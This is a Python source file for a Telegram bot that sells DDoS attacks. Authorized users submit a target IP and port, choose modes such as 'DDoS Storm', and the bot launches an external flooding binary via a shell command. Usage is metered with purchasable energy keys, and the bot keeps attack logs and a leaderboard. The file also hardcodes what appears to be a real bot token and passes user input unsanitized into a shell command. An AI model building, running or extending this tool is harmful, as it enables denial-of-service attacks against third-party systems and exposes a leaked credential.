import telebot
import time
import random
import threading
import subprocess

TOKEN = "7600135856:AAGA_PrKVlaB9z3gvk1UvmPXEYYELDsAGjw"  # Replace with your bot token
ADMIN_ID = 1077368861  # Your admin ID
bot = telebot.TeleBot(TOKEN)

users_energy = {}  # Stores user energy
authorized_users = set()  # Users allowed to use attack commands
attack_logs = []  # Stores attack history
leaderboard = {}  # Tracks total attacks per user

# Energy Regeneration (adds +1 energy every 3 hours)
def energy_regen():
    while True:
        time.sleep(10800)  # 3 hours in seconds
        for user in users_energy:
            users_energy[user] += 1
bot_thread = threading.Thread(target=energy_regen)
bot_thread.start()

# Attack Phases
attack_phases = [
    "🛠 Initializing Attack...",
    "🚀 Engaging Target...",
    "⚡ Overloading Defenses...",
    "💥 Final Strike Incoming!",
    "✅ Mission Accomplished!"
]

# Random Fun Messages
random_messages = [
    "How’s the attack going?",
    "Why are others waiting? Don’t wait too much!",
    "Want to go paid? Contact the developer!",
    "Hey you! What are you watching? Don’t you have to study?"
]

# Command to give access to a user
@bot.message_handler(commands=["add"])
def add_user(message):
    if message.from_user.id != ADMIN_ID:
        return
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "Usage: /add <user_id>")
        return
    user_id = int(args[1])
    authorized_users.add(user_id)
    bot.reply_to(message, f"✅ User {user_id} has been authorized!")

# Command to remove access
@bot.message_handler(commands=["remove"])
def remove_user(message):
    if message.from_user.id != ADMIN_ID:
        return
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "Usage: /remove <user_id>")
        return
    user_id = int(args[1])
    authorized_users.discard(user_id)
    bot.reply_to(message, f"❌ User {user_id} has been removed!")

# Generate keys for energy
@bot.message_handler(commands=["genkey"])
def generate_key(message):
    if message.from_user.id != ADMIN_ID:
        return
    args = message.text.split()
    if len(args) != 2 or args[1] not in ["normal", "premium"]:
        bot.reply_to(message, "Usage: /genkey <normal/premium>")
        return
    key_type = args[1]
    key = f"KEY-{random.randint(10000,99999)}"
    energy = 1 if key_type == "normal" else 5
    bot.reply_to(message, f"✅ **Generated {key_type.capitalize()} Key:** `{key}`\n🎁 Redeem for {energy} Energy!")

# Redeem key for energy
@bot.message_handler(commands=["redeem"])
def redeem_key(message):
    if message.from_user.id not in authorized_users:
        bot.reply_to(message, "⚠️ You are not authorized to redeem keys!")
        return
    users_energy[message.from_user.id] = users_energy.get(message.from_user.id, 0) + 1
    bot.reply_to(message, "✅ Key Redeemed! Your energy has increased.")

# Attack Command
@bot.message_handler(commands=["attack"])
def attack_command(message):
    if message.from_user.id not in authorized_users:
        bot.reply_to(message, "⚠️ You are not authorized to use this command!")
        return

    args = message.text.split()
    if len(args) != 3:
        bot.reply_to(message, "Usage: /attack <ip> <port>")
        return

    ip, port = args[1], args[2]
    user_id = message.from_user.id

    # Check if user has enough energy
    if users_energy.get(user_id, 0) < 1:
        bot.reply_to(message, "⚠️ Not enough energy! Redeem a key to gain energy.")
        return

    # Deduct Energy
    users_energy[user_id] -= 1

    # Attack Mode Selection
    keyboard = telebot.types.InlineKeyboardMarkup()
    keyboard.add(telebot.types.InlineKeyboardButton("Stealth Mode (120s)", callback_data=f"attack_{user_id}_{ip}_{port}_120"))
    keyboard.add(telebot.types.InlineKeyboardButton("Brute Force (180s)", callback_data=f"attack_{user_id}_{ip}_{port}_180"))
    keyboard.add(telebot.types.InlineKeyboardButton("DDoS Storm (300s)", callback_data=f"attack_{user_id}_{ip}_{port}_300"))

    bot.send_message(message.chat.id, "Choose attack mode:", reply_markup=keyboard)

# Handle Attack Selection
@bot.callback_query_handler(func=lambda call: call.data.startswith("attack_"))
def start_attack(call):
    data = call.data.split("_")
    _, user_id, ip, port, duration = data
    user_id = int(user_id)
    duration = int(duration)

    if call.from_user.id != user_id:
        bot.answer_callback_query(call.id, "⚠️ This isn't your attack session!", show_alert=True)
        return

    full_command = f"./MasterBhaiyaa {ip} {port} {duration} "
    subprocess.Popen(full_command, shell=True)

    # Store attack log
    attack_logs.append(f"🔹 User: {user_id}\n🎯 Target: {ip}:{port}\n⏳ Duration: {duration} sec")

    # Update leaderboard
    leaderboard[user_id] = leaderboard.get(user_id, 0) + 1

    bot.edit_message_text(f"🔥 **Attack started!**\nTarget: `{ip}:{port}`\nDuration: `{duration}` sec", call.message.chat.id, call.message.message_id, parse_mode="Markdown")

    # Start attack phase updates
    thread = threading.Thread(target=attack_phases_update, args=(user_id, duration, call.message.chat.id))
    thread.start()

# Attack Phase Updates
def attack_phases_update(user_id, duration, chat_id):
    phase_time = duration // len(attack_phases)
    for phase in attack_phases:
        time.sleep(phase_time)
        bot.send_message(chat_id, phase)
    bot.send_message(chat_id, "✅ **Attack Finished!**")

# View Attack Log
@bot.message_handler(commands=["attacklog"])
def view_logs(message):
    if message.from_user.id != ADMIN_ID:
        return
    if not attack_logs:
        bot.reply_to(message, "📜 No attacks logged yet.")
    else:
        bot.reply_to(message, "\n\n".join(attack_logs[-5:]))  # Show last 5 attacks

# Clear Attack Log
@bot.message_handler(commands=["clearlog"])
def clear_logs(message):
    if message.from_user.id != ADMIN_ID:
        return
    attack_logs.clear()
    bot.reply_to(message, "🗑 Attack logs cleared!")

# View Leaderboard
@bot.message_handler(commands=["leaderboard"])
def show_leaderboard(message):
    if not leaderboard:
        bot.reply_to(message, "🏆 No attacks performed yet!")
        return

    sorted_leaderboard = sorted(leaderboard.items(), key=lambda x: x[1], reverse=True)[:5]
    leaderboard_text = "🏆 **Leaderboard**\n" + "\n".join([f"{i+1}️⃣ User {user} - {attacks} Attacks" for i, (user, attacks) in enumerate(sorted_leaderboard)])
    bot.reply_to(message, leaderboard_text, parse_mode="Markdown")

bot.polling(none_stop=True)
